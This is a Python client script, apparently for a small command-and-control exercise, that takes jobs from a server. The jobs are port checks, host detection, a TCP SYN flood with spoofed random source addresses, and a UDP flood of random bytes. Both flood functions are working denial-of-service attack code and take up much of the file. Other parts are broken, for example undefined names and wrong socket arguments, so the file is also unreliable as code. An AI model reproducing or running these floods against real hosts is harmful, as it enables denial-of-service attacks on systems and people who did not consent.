import socket
import ipaddress
import random
import time
from scapy.all import *

def tcp_synFlood():

    d_addr = input("Destination IP address: ")
    dport = int(input("Destination port: "))
    sport = 1234
    s_addr = RandIP()
    

    packet = IP(src=s_addr,dst=d_addr)/TCP(sport=sport, dport=dport, seq=1505066, flags="S")

    duration = float(input("number of seconds to flood "))
    timeout = time.time()+duration
    sent = 0
    while True:
        if time.time()>timeout:
            break
        else:
            pass
        send(packet)
    
def DetectHostsJob():
    hn = socket.gethostname()
    str_networkIP = socket.gethostbyname(hn)    #Gets IP of current network
    
    # <<<<< Recv #4
    ClearData(ClientSocket)
    undec_hostAddr = ClientSocket.recv(1024)    #Gets the host IP we're searching for from the server
    str_hostAddr = undec_hostAddr.decode('utf-8')

    print("\nAddress received from server: " + str_hostAddr)
    print("Host address " + str_networkIP)
    
    # >>>>> Send #5
    if ipaddress.ip_address(str_hostAddr) in ipaddress.ip_network(str_networkIP):
        ClientSocket.send(str.encode("Yes, " + str_hostAddr + " is currently connected to " + str_networkIP + "."))
    else:
        ClientSocket.send(str.encode("No. On " + str_networkIP + ", " + str_hostAddr + " is currently offline."))

# Clears socket of data
def ClearData(toClearSocket):
    while True:
        try:
            PacketBytes = toClearSocket.__Listener.recv(1024)
        except:
            break;

def RecvRequestedPort():
    
    # <<<<< Recv #4
    #ClearData(ClientSocket)
    undec_ipToCheck = ClientSocket.recv(1024)   #Gets the host IP we're searching for from the server
    ipToCheck = undec_ipToCheck.decode('utf-8')
    print("IP received from server: " + ipToCheck)
    
    ClientSocket.send(str.encode("flush me please"))

    undec_portToCheck = ClientSocket.recv(1024) #Gets the port of the IP that we're seraching for
    portToCheck = undec_portToCheck.decode('utf-8')
    print("Port received from server: " + portToCheck)
    
    portOpen = False
    
    try:    #Is the port open? If yes, portOpen is true
        coneck = ClientSocket.connect(host, int(ScanPort))
        portOpen = true
    except: #Nope the port is not open otherwise
        pass
        
    if portOpen == True:
        ClientSocket.send(str.encode("Port " + portToCheck + " is open.")) #open
    else:
        ClientSocket.send(str.encode("Port " + portToCheck + " is closed.")) #closed/filtered
        
def flood():
    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    floodip = input("IP:")
    floodport = int(input("port"))
    duration = float(input("number of seconds to flood "))
    timeout = time.time()+duration
    sent = 0
    while True:
        if time.time()>timeout:
            break
        else:
            pass
        sock.sendto(bytes,(floodip,floodport))
        sent = sent+1
        print("sent %s packet to %s through port %s "%(sent,floodip,floodport))

    
# ---------------------------------------------------------------------------------------------------------
        
ClientSocket = socket.socket()
host = '127.0.0.1'
port = 1233

print('Waiting for connection')
try:
    ClientSocket.connect((host, port))
except socket.error as e:
    print(str(e))

while True:
    Input = input(ClientSocket.recv(1024).decode('utf-8'))  # Asks the client which job they want
    ClientSocket.send(str.encode(Input))        #Replies with selected job  
    reply = ClientSocket.recv(1024)     #Notification of job given
    print(reply.decode('utf-8'))

    if (Input == '1'):  #job 1 is the IP detection
        RecvRequestedPort()
        
    elif (Input == '2'): #if job 2 was accepted, get the address we need to find on the network
        DetectHostsJob()
        
    elif(Input == '3'): #tcp flood job
        tcp_synFlood()
        
    elif (Input == '4'):    #udp flood job
        flood()
ClientSocket.close()



    
